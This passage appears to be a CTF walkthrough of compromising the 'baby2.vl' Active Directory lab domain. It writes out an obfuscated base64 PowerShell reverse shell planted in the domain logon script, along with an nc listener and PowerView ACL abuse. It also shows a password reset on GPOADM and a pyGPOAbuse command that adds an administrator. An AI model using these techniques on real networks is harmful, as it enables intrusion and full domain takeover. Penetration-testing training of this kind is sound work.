LDAP        10.129.234.72   389    DC               Compressing output into /root/.nxc/logs/DC_10.129.234.72_2026-04-29_232932_bloodhound.zip
                                                                                                                                                      
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Setup-Docker-x86" >}} Install the Docker which is matched to install docker-bloodhound

{{< /toggle >}}

### Install the Docker

First, ensure you have the necessary tools to fetch the key, then add it to your system. Run these commands one by one:

```
sudo apt update
sudo apt install ca-certificates curl gnupg
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg
```

Since Kali is based on Debian Testing, using the Debian "bookworm" (Debian 12) repository is the safest bet for compatibility.

```
┌──(root㉿kali)-[~/Downloads]
└─# echo "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
                         
```

```
┌──(root㉿kali)-[~/Desktop]
└─# apt update
apt install docker.io docker-compose
Hit:1 https://brave-browser-apt-release.s3.brave.com stable InRelease

```

```
┌──(root㉿kali)-[~/Desktop]
└─# systemctl enable --now docker
Synchronizing state of docker.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
Executing: /usr/lib/systemd/systemd-sysv-install enable docker

```

### bloodhound docker install

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo ./bloodhound-cli install 
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[*] A development YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
 graph-db Pulling 
 bloodhound Pulling 
 app-db Pulling 
error getting credentials - err: exec: "docker-credential-desktop": executable file not found in $PATH, out: ``
[-] Error from `docker`: exit status 1
2026/04/29 23:55:56 Error trying to build with /root/.config/bloodhound/docker-compose.yml: exit status 1
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# mv ~/.docker/config.json ~/.docker/config.json.bak

```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo ./bloodhound-cli install                     
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[*] A development YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
 app-db Pulling 
 graph-db Pulling 
 bloodhound Pulling 
 3531af2bc2a9 Pulling fs layer 
 3326b6522e5b Pulling fs layer 
 decd178ddeb0 Pulling fs layer 
 
 . . . [snip] . . .

[+] BloodHound isroo ready to go!
[+] You can log in as `admin` with this password: rhymzUPQzbWkUWoGGn1KFhLdviT2rnQZ
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login

```

![Pasted image 20260430132023.png](/ob/Pasted%20image%2020260430132023.png)

the account is not outbound , maybe we miss something

compare to guest , i have more permission to write , that is the hint to do the poison to NTLM

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb dc.baby2.vl -u Carl.Moore -p Carl.Moore --shares

SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE      
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE      
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share 
                                                                                          
┌──(root㉿kali)-[~/Desktop]
└─#  nxc smb DC.baby2.vl  -u 'library' -p 'library' --shares

SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE      
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE      
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-View-All-User" >}} Using the cypher to find all users to know who is potential to attack

{{< /toggle >}}

{{< code >}}\
MATCH (u:User) RETURN u\
{{< /code >}}

![Pasted image 20260430133016.png](/ob/Pasted%20image%2020260430133016.png)

![Pasted image 20260430133312.png](/ob/Pasted%20image%2020260430133312.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-loginscript" >}} I’ve already seen that Amelia.Griffiths uses `login.vbs` as a logon script. Even without seeing that, given the shortcut file pointing at this script on `SYSVOL`, it’s reasonable to make a guess that this script is run on login by users in the domain.

{{< /toggle >}}

i can try to modify the Logonscript due to i have the Preemission

Interestingly, not only can I read it, but I can write it (despire `netexec` saying this was read only access):

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient //dc.baby2.vl/SYSVOL -U Carl.Moore%Carl.Moore
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 22 13:37:36 2023
  ..                                  D        0  Tue Aug 22 13:37:36 2023
  baby2.vl                           Dr        0  Tue Aug 22 13:37:36 2023

                6126847 blocks of size 4096. 1931744 blocks available
smb: \> cd baby2.vl
smb: \baby2.vl\> ls
  .                                   D        0  Tue Aug 22 13:43:55 2023
  ..                                  D        0  Tue Aug 22 13:37:36 2023
  DfsrPrivate                      DHSr        0  Tue Aug 22 13:43:55 2023
  Policies                            D        0  Tue Aug 22 13:37:41 2023
  scripts                             D        0  Mon Aug 25 04:30:39 2025

                6126847 blocks of size 4096. 1931744 blocks available
smb: \baby2.vl\> cd scripts\
smb: \baby2.vl\scripts\> ls
  .                                   D        0  Mon Aug 25 04:30:39 2025
  ..                                  D        0  Tue Aug 22 13:43:55 2023
  login.vbs                           A      992  Sat Sep  2 10:55:51 2023

                6126847 blocks of size 4096. 1931744 blocks available
smb: \baby2.vl\scripts\> 

```

I’ve already seen that Amelia.Griffiths uses `login.vbs` as a logon script. Even without seeing that, given the shortcut file pointing at this script on `SYSVOL`, it’s reasonable to make a guess that this script is run on login by users in the domain.

i will add the `Set cmdshell = CreateObject("Wscript.Shell")` to run the `cmdshell.run`

```
┌──(root㉿kali)-[~/Desktop]
└─# tail login.vbs
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAuADEAMQAwAC4AMQAzADkAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"

```

```
smb: \baby2.vl\scripts\> put login.vbs
putting file login.vbs as \baby2.vl\scripts\login.vbs (1.6 kB/s) (average 1.6 kB/s)
```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.43] from (UNKNOWN) [10.129.234.72] 64852


```

### Enumeration

is Amelia.Griffiths to login first , so we can abuse this account

i will quickly add the Amelia.Griffiths is owned

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-WriteOwner-WriteDacl" >}} As a member of the legacy group, Amelia.Griffiths has `WriteOwner` and `WriteDacl` over both the GPOADM group and the GPO-Management OU.

{{< /toggle >}}

![Pasted image 20260430134620.png](/ob/Pasted%20image%2020260430134620.png)

As a member of the legacy group, Amelia.Griffiths has `WriteOwner` and `WriteDacl` over both the GPOADM group and the GPO-Management OU.

```
┌──(root㉿kali)-[~/Desktop]
└─# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 
--2026-04-30 01:52:12--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 770279 (752K) [text/plain]
Saving to: ‘PowerView.ps1’

PowerView.ps1                                              100%[========================================================================================================================================>] 752.23K  2.98MB/s    in 0.2s    

2026-04-30 01:52:13 (2.98 MB/s) - ‘PowerView.ps1’ saved [770279/770279]

```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
PS C:\ProgramData> PS C:\ProgramData> curl  10.10.16.43/PowerView.ps1 -o C:\ProgramData\PowerView.ps1
PS C:\ProgramData> 
```

```
PS C:\ProgramData> Set-ExecutionPolicy Bypass -Scope Process -Force
PS C:\ProgramData> Import-Module .\\PowerView.ps1 -Force
PS C:\ProgramData> . .\\PowerView.ps1
PS C:\ProgramData> Get-NetDomain


Forest                  : baby2.vl
DomainControllers       : {dc.baby2.vl}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc.baby2.vl
RidRoleOwner            : dc.baby2.vl
InfrastructureRoleOwner : dc.baby2.vl
Name                    : baby2.vl

```

Now I’ll give Amelia.Griffiths permissions over the GPOADM account, and then set the password:

```
PS C:\ProgramData> Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths

PS C:\ProgramData> $cred = ConvertTo-SecureString 'testest.' -AsPlainText -Force
PS C:\ProgramData> Set-DomainUserPassword GPOADM -AccountPassword $cred
PS C:\ProgramData> 

```

it works !

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb dc.baby2.vl -u GPOADM -p testest. 
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.72   445    DC               [+] baby2.vl\GPOADM:testest. 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-vectory-GenericAll-Group" >}} The GPOADM account has `GenericAll` over two group policy objects (GPOs) , These are marked as high value objects as they give full control over the domain. I need the GPO ID, which BloodHound gives.

{{< /toggle >}}

The GPOADM account has `GenericAll` over two group policy objects (GPOs):

These are marked as high value objects as they give full control over the domain. I need the GPO ID, which BloodHound gives:

CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=BABY2,DC=VL

CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=BABY2,DC=VL

![Pasted image 20260430140131.png](/ob/Pasted%20image%2020260430140131.png)

I’ll use the [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) tool to get execution from a GPO. I’ll clone it to my host and make sure it has the metadata to run with `uv`:

```
┌──(root㉿kali)-[~/Desktop]
└─# git clone https://github.com/Hackndo/pyGPOAbuse.git
Cloning into 'pyGPOAbuse'...
remote: Enumerating objects: 170, done.
remote: Counting objects: 100% (133/133), done.
remote: Compressing objects: 100% (67/67), done.
remote: Total 170 (delta 89), reused 96 (delta 66), pack-reused 37 (from 1)
Receiving objects: 100% (170/170), 1.16 MiB | 3.72 MiB/s, done.
Resolving deltas: 100% (95/95), done.
                                                                                                                    
┌──(root㉿kali)-[~/Desktop]
└─# cd pyGPOAbuse/
                                                                                                                    
┌──(root㉿kali)-[~/Desktop/pyGPOAbuse]
└─# uv add --script pygpoabuse.py -r requirements.txt
Resolved 36 packages in 1.65s

```

I need to feed the script auth for the user who can edit GPOs, the GPO id, and the command to run:

```
┌──(root㉿kali)-[~/Desktop/pyGPOAbuse]
└─# uv run --script pygpoabuse.py baby2.vl/GPOADM:testest. -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
      Built impacket==0.13.0
Installed 34 packages in 63ms
[+] ScheduledTask TASK_0b852357 created!

```

After a few seconds, GPOADM is in the Administrators group:

```
PS C:\ProgramData>  net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
gpoadm
The command completed successfully.


```

I’ll use `evil-winrm-py` to get a shell:

```
evil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         4/16/2025   2:47 AM             32 root.txt                                                              


evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
293500962edc31fa154951eeeb5740f9

```
